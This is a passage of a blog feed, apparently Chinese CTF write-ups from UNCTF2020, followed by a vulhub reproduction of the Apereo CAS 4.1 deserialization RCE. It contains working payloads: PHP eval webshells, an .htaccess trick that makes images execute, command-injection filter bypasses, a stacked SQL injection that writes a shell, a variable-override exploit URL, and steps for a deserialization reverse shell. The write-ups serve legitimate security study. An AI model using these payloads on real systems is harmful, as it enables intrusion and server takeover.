class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">这里可以换别的过滤器</span><br></pre></td></tr></table></figure><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php短标签</li><li>.htaccess</li></ul><h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题上传图片马</p><img src="/2020/11/11/UNCTF2020/7.png" class=""><p>对内容进行了检测</p><p>这里想到了php短标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);==&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这里还有就是不能把jpg文件解析成php文件，需要上传.htaccess</p><p>由于过滤了ph，换行拼接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.htaccess</span></span><br><span class="line">Addtype application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure><p>上传图片，抓包修改文件名和内容如上</p><p>之后就可以直接利用马了</p><img src="/2020/11/11/UNCTF2020/8.png" class=""><h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行一些绕过</li></ul><h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，是一个ping窗口，命令执行</p><p>127.0.0.1能够正常返回，下面就是进行测试了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,;,空格，*,flag,cat,$等被过滤了</span><br></pre></td></tr></table></figure><p>没有了分号还能用管道符，空格能用%09代替，flag用fla?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls%<span class="number">09</span>/</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ca\t%<span class="number">09</span>/fla?</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/9.png" class=""><h2 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h2><h3 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h3><ul><li>文件判断</li></ul><h3 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="keyword">false</span>))</span><br><span class="line">&#123;</span><br><span class="line">flag</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">no flag</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//想要拿到flag要让!()为真，也就是比较为false</span></span><br></pre></td></tr></table></figure><p>本地测试传入数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $p = $_GET[<span class="string">'file'</span>];</span><br><span class="line">var_dump($p);<span class="comment">//array(1) &#123; [0]=&gt; string(0) "" &#125;</span></span><br><span class="line">var_dump(is_file($p));<span class="comment">//NULL</span></span><br><span class="line">var_dump(<span class="keyword">NULL</span>===<span class="keyword">false</span>);<span class="comment">//false</span></span><br><span class="line">var_dump(<span class="keyword">NULL</span>===<span class="keyword">true</span>);<span class="comment">//false</span></span><br><span class="line"><span class="keyword">if</span>((is_file($p)===<span class="keyword">false</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'bad'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到传入数组返回值为NULL，NULL怎么比较返回都是false，所以用数组即可绕过</p><img src="/2020/11/11/UNCTF2020/10.png" class=""><h2 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h2><h3 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h3><ul><li>写入shell</li></ul><h3 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h3><p>堆叠注入，但是set,prepare,execute不能一起用，题目提示flag不在数据库，尝试写入shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"select '&lt;?php eval($_POST[123])?&gt;' into outfile '/var/www/html/1.php'"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(ord(i),end=<span class="string">','</span>)</span><br><span class="line"><span class="comment">#1';PREPARE hacker from concat(char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,49,50,51,93,41,32,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,49,46,112,104,112,39));EXECUTE hacker;</span></span><br></pre></td></tr></table></figure><p>访问1.php，下面就是常规操作了</p><img src="/2020/11/11/UNCTF2020/11.png" class=""><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php复杂变量</li><li>变量覆盖</li><li>sha1比较</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$adminPassword = <span class="string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'fuxkSQL'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span><span class="params">($iText)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">'\"'</span>, <span class="string">'"'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"\'"</span>, <span class="string">"'"</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"'"</span>, <span class="string">"''"</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'getVars'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can set config variables!!'</span> . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br></pre></td></tr></table></figure><p>存在变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($password) === $adminPassword<span class="comment">//只需要传入任意值和其md5值分给赋给$password和$adminPassword即可</span></span><br></pre></td></tr></table></figure><p>php弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure><p>只有以科学计数法0e开头的才可能满足条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i5 = <span class="number">0</span>; $i5 &lt;= <span class="number">9999999999</span>; $i5++) &#123;</span><br><span class="line">    $res = <span class="string">'0e'</span> . $i5;</span><br><span class="line">    <span class="comment">//0e1290633704</span></span><br><span class="line">    <span class="keyword">if</span> ($res == hash(<span class="string">'sha1'</span>, $res)) &#123;</span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php复杂变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>检测匹配以var开头跟1到2个数字字符的变量值，这里利用php复杂变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?source&#x3D;&amp;adminPassword&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;password&#x3D;1&amp;verif&#x3D;0e1290633704&amp;var1&#x3D;&#123;$_GET[1]&#125;&amp;var3&#x3D;$&#123;$var1()&#125;&amp;1&#x3D;phpinfo</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/12.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;UNCTF2020赛题部分WP&quot;&gt;&lt;a href=&quot;#UNCTF2020赛题部分WP&quot; class=&quot;headerlink&quot; title=&quot;UNCTF2020赛题部分WP&quot;&gt;&lt;/a&gt;UNCTF2020赛题部分WP
    
    </summary>
    
    
    
      <category term="UNCTF" scheme="http://yoursite.com/tags/UNCTF/"/>
    
  </entry>
  
  <entry>
    <title>Apereo-CAS-4.1-反序列化命令执行</title>
    <link href="http://yoursite.com/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-11-08T05:29:14.000Z</published>
    <updated>2020-11-09T11:48:22.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apereo-CAS-4-1-反序列化命令执行"><a href="#Apereo-CAS-4-1-反序列化命令执行" class="headerlink" title="Apereo-CAS-4.1-反序列化命令执行"></a>Apereo-CAS-4.1-反序列化命令执行<a id="more"></a></h2><h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>Apereo CAS 是一个开源的企业级单点登录系统，很多统一认证系统都是基于此系统二次开发</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Apereo-CAS&lt;=4.1.6</li></ul><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">centos</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看cas中登录的配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#/WEB-INF/cas-servlet.cml:151行</span><br><span class="line">&lt;bean id=<span class="string">"loginHandlerAdapter"</span></span><br><span class="line">       <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter"</span></span><br><span class="line">       p:supportedFlowId=<span class="string">"login"</span></span><br><span class="line">       p:flowExecutor-ref=<span class="string">"loginFlowExecutor"</span></span><br><span class="line">       p:flowUrlHandler-ref=<span class="string">"loginFlowUrlHandler"</span> /&gt;</span><br></pre></td></tr></table></figure><p>每次登录都会调用<code>SelectiveFlowHandlerAdapter</code>类中的<code>handle</code>方法进行处理，关键代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FlowHandler flowHandler = (FlowHandler)handler;</span><br><span class="line">        <span class="keyword">this</span>.checkAndPrepare(request, response, <span class="keyword">false</span>);      </span><br><span class="line">        <span class="comment">// flowExecutionKey是POST的“execution”的参数值，其中的flowUrlHandler在登录相关的配置文件中有配置“p:flowUrlHandler-ref="loginFlowUrlHandler"”</span></span><br><span class="line">        String flowExecutionKey = <span class="keyword">this</span>.flowUrlHandler.getFlowExecutionKey(request);</span><br><span class="line">        <span class="keyword">if</span> (flowExecutionKey != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ServletExternalContext context = <span class="keyword">this</span>.createServletExternalContext(request, response);               </span><br><span class="line"> <span class="comment">//用来恢复execute中存储的当前状态，漏洞从这里开始，其中flowExecutor在登录相关的配置文件中可以找到</span></span><br><span class="line"><span class="comment">//p:flowExecutor-ref="loginFlowExecutor"，loginFlowExecutor对应的类为“org.springframework.webflow.executor.FlowExecutorImpl”</span></span><br><span class="line">                FlowExecutionResult result = <span class="keyword">this</span>.flowExecutor.resumeExecution(flowExecutionKey, context);</span><br><span class="line">                <span class="keyword">this</span>.handleFlowExecutionResult(result, context, request, response, flowHandler);</span><br></pre></td></tr></table></figure><p>接着跟进<code>this.flowExecutor.resumeExecution</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.webflow.executor.FlowExecutorImpl.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FlowExecutionResult <span class="title">resumeExecution</span><span class="params">(String flowExecutionKey, ExternalContext context)</span> <span class="keyword">throws</span> FlowException </span>&#123;</span><br><span class="line">        FlowExecutionResult var6;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Resuming flow execution with key '"</span> + flowExecutionKey);</span><br><span class="line">            &#125;</span><br><span class="line">            ExternalContextHolder.setExternalContext(context);</span><br><span class="line">            <span class="comment">// 简单解析flowExecutionKey的数据到FlowExecutionKey对象，供后续使用</span></span><br><span class="line">            FlowExecutionKey key = <span class="keyword">this</span>.executionRepository.parseFlowExecutionKey(flowExecutionKey);</span><br><span class="line">            FlowExecutionLock lock = <span class="keyword">this</span>.executionRepository.getLock(key);</span><br><span class="line">            lock.lock();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过FlowExecutionKey恢复状态，其中处理不当导致了反序列化漏洞</span></span><br><span class="line">                FlowExecution flowExecution = <span class="keyword">this</span>.executionRepository.getFlowExecution(key);</span><br><span class="line">                flowExecution.resume(context);</span><br></pre></td></tr></table></figure><p>继续跟进<code>this.executionRepository.getFlowExecution</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FlowExecution <span class="title">getFlowExecution</span><span class="params">(FlowExecutionKey key)</span> <span class="keyword">throws</span> FlowExecutionRepositoryException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(key <span class="keyword">instanceof</span> ClientFlowExecutionKey)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Expected instance of ClientFlowExecutionKey but got "</span> + key.getClass().getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 从上一步解析出的key对象中获取序列化相关的数据</span></span><br><span class="line">            <span class="keyword">byte</span>[] encoded = ((ClientFlowExecutionKey)key).getData();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//在this.transcoder.decode(encoded)代码解密中同时进行了反序列化恢复状态</span></span><br><span class="line">                ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)<span class="keyword">this</span>.transcoder.decode(encoded);</span><br></pre></td></tr></table></figure><p>漏洞触发点在解密代码处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">decode</span><span class="params">(<span class="keyword">byte</span>[] encoded)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = <span class="keyword">this</span>.cipherBean.decrypt(encoded);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Decryption error"</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line">        ByteArrayInputStream inBuffer = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">null</span>;</span><br><span class="line">        Object var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.compression) &#123;</span><br><span class="line">                in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> GZIPInputStream(inBuffer));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                in = <span class="keyword">new</span> ObjectInputStream(inBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 触发反序列化漏洞</span></span><br><span class="line">            var5 = in.readObject();</span><br></pre></td></tr></table></figure><p>调用了<code>cipherBean</code>对密文进行解密，之后进行了反序列化，调用的decode方法属于<code>EncryptedTranscoder</code>类，该类还定义了encode，直接调用<code>org.jasig.spring.webflow.plugin.EncryptedTranscoder#encode</code>生成加密字节数组后<code>base64</code>，加上<code>uuid-</code>构成execution的值</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问<code>/ip/cas/login</code></p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png" class=""><p>输入账号、密码，用burp抓包</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png" class=""><p>可以看到这里有个<code>execution</code>参数，这里就是利用点，下面用给的<code>jar</code>包生成<code>poc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">这里要用到ysoserial这个java反序列化poc生成工具，可以从下面的网址下载</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial</span><br><span class="line">具体的使用方法暂时还没有搞清楚（找个时间研究一下），找了个已经给了jar包的地址，如下</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;Apereo-CAS-Attack&#x2F;releases&#x2F;tag&#x2F;v1.0.0</span><br></pre></td></tr></table></figure><p>命令行进入到<code>apereo-cas-attack-1.0-SNAPSHOT-all.jar</code>所在目录，尝试使用在<code>/tmp</code>目录下创建<code>success</code>文件</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png" class=""><p>在burp中把<code>execution</code>的参数值替换掉，Go一下</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png" class=""><p>进入docker容器中进行查看</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png" class=""><p>可以看到创建成功了，也就是说命令成功执行了</p><p>下面可以试试反弹shell</p><p>这里有个生成反弹shell的网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.jackson-t.ca&#x2F;runtime-exec-payloads.html</span><br></pre></td></tr></table></figure><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png" class=""><p>接着再生成poc，重复上面的步骤</p><p>在服务器上监听2000端口，打过去，可以看到shell成功反弹了</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png" class=""><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 